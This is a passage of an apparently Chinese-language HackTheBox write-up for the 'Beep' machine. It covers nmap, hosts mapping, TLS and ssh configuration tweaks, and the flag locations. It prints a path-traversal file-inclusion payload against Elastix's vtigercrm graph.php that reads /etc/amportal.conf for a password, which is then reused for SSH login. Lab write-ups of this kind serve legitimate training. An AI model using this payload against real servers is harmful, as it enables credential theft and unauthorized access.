</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-beep/image-20250202162932802.png" class="" title="nmap">

<p>添加映射</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.10.7  beep.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/hosts</code></pre>

<p>访问<a href="https://beep.htb/">https://beep.htb</a> 发现新版火狐浏览器不支持低版本SSL，修改浏览器配置，地址栏输入<code>about:config</code> , 输入<code>security.tls.version.min</code> 修改值为1 </p>
<img src="/Hackthebox/htb/htb-beep/image-20250202170324934.png" class="" title="修改火狐配置">

<img src="/Hackthebox/htb/htb-beep/image-20250202170450821.png" class="" title="访问目标">

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用searchsploit 检索Elastix ，查看<code>37637.pl</code> ,获取到payload：<code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code>   搜索关键字 “AMPDBPASS” 获取到密码</p>
<img src="/Hackthebox/htb/htb-beep/image-20250202171030333.png" class="" title="searchsploit">

<img src="/Hackthebox/htb/htb-beep/image-20250202172215531.png" class="" title="payload">

<p>使用获取到的密码进行ssh登录，发现算法不支持，修改一下本地配置：编辑 ~&#x2F;.ssh&#x2F;config 添加</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">Host *
  Ciphers +aes128-cbc
  KexAlgorithms +diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
  HostKeyAlgorithms +ssh-rsa
</code></pre>

<img src="/Hackthebox/htb/htb-beep/image-20250202172249979.png" class="" title="ssh">

<img src="/Hackthebox/htb/htb-beep/image-20250202172514124.png" class="" title="修改ssh配置">

<img src="/Hackthebox/htb/htb-beep/image-20250203203836733.png" class="" title="ssh访问">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;fanis&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
      </tags>
  </entry>
</search>
